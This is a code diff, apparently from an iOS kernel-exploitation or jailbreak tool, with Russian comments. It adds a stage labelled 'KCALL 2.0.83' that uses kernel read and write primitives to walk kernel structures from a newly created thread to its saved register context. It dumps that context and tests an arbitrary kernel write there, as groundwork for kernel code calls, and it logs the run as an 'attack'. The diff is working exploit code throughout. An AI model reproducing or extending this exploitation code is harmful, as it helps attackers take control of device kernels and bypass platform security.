@@ -3089,7 +3089,81 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3] выше\n"];
+    // ---- KCALL FOUNDATION 2.0.83 ----
+    // Fugu14-style: thread_create → find ACT_CONTEXT (machine_contextData) →
+    // dump/write register state. Пока только чтение+безопасная проба записи.
+    [r appendString:@"=== KCALL 2.0.83: thread ACT_CONTEXT ===\n"];
+    {
+        thread_t th = 0;
+        kern_return_t kr = thread_create(mach_task_self(), &th);
+        kpNote(r, [NSString stringWithFormat:@"  [KCALL] thread_create kr=0x%x th=0x%x", kr, th]);
+        if (kr == KERN_SUCCESS && th) {
+            // находим kernel-указатель потока через isTable (как IOSurface)
+            uint64_t isT = 0;
+            {
+                uint64_t pr2 = early_kread64(selfProc + koffsetof(proc, proc_ro));
+                uint64_t tk2 = pr2 ? early_kread64(kp_untag_ptr(pr2) + off_proc_ro_pr_task) : 0;
+                uint64_t spc2 = tk2 ? early_kread64(kp_untag_ptr(tk2) + off_task_itk_space) : 0;
+                uint64_t tb2 = spc2 ? early_kread64(kp_untag_ptr(spc2) + off_ipc_space_is_table) : 0;
+                if (tb2) isT = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                              ? kp_untag_ptr(kpSMRDecode(tb2)) : kp_untag_ptr(tb2);
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [KCALL] isTable=%#llx", (unsigned long long)isT]);
+            // port → ipc_entry → ie_object → thread*
+            uint64_t thK = 0;
+            if (isT && th) {
+                uint64_t eVA = isT + (uint64_t)sizeof_ipc_entry * (th >> 8);
+                uint64_t ieObj = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
+                kpNote(r, [NSString stringWithFormat:@"  [KCALL] ie_object=%#llx", (unsigned long long)ieObj]);
+                // ipc_port → ip_kobject
+                if (kpLooksLikeKernelPointer(ieObj)) {
+                    // пробуем несколько смещений kobject
+                    for (uint32_t ko = 0x18; ko <= 0x40; ko += 8) {
+                        uint64_t cand = kp_untag_ptr(early_kread64(ieObj + ko));
+                        if (!kpLooksLikeKernelPointer(cand)) continue;
+                        // проверка: у кандидата есть t_tro / machine_contextdata-похожее
+                        uint64_t tro = kp_untag_ptr(early_kread64(cand + off_thread_t_tro));
+                        if (kpLooksLikeKernelPointer(tro)) {
+                            thK = cand;
+                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] thread*=%#llx (via +x%x)", (unsigned long long)cand, ko]);
+                            break;
+                        }
+                    }
+                }
+            }
+            uint64_t actCtx = 0;
+            if (thK && off_thread_machine_contextdata) {
+                actCtx = kp_untag_ptr(early_kread64(thK + off_thread_machine_contextdata));
+                kpNote(r, [NSString stringWithFormat:@"  [KCALL] machine_contextData=%#llx", (unsigned long long)actCtx]);
+            }
+            if (kpLooksLikeKernelPointer(actCtx)) {
+                uint64_t pa = kvtophys(actCtx & ~0x3fffULL);
+                int t = pa ? kpFrameTypeOf(pa) : -1;
+                kpNote(r, [NSString stringWithFormat:@"  [KCALL] ctx pagePA=%#llx type=%d", (unsigned long long)pa, t]);
+                NSMutableString *regs = [NSMutableString string];
+                for (int i = 0; i < 16; i++)
+                    [regs appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(actCtx + i * 8)];
+                kpNote(r, [NSString stringWithFormat:@"  [KCALL] ctx dump:%@", regs]);
+                // проба записи: сохранили x0-слот, записали маркер, вернули
+                if (t == 0x21) {
+                    uint64_t sv = early_kread64(actCtx + 0x10);
+                    early_kwrite64(actCtx + 0x10, 0x4B43414C4C000001ULL);
+                    uint64_t rb = early_kread64(actCtx + 0x10);
+                    early_kwrite64(actCtx + 0x10, sv);
+                    kpNote(r, [NSString stringWithFormat:@"  [KCALL] write-test readback=%#018llx → %@",
+                              (unsigned long long)rb,
+                              rb == 0x4B43414C4C000001ULL ? @"ACT_CONTEXT ПИШЕТСЯ ★★" : @"не село"]);
+                } else {
+                    kpNote(r, @"  [KCALL] ctx type!=0x21 — kwrite запрещён");
+                }
+            } else {
+                kpNote(r, @"  [KCALL] ACT_CONTEXT не найден");
+            }
+            thread_terminate(th);
+        }
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[KCALL] выше\n"];
     return r;
 
 }
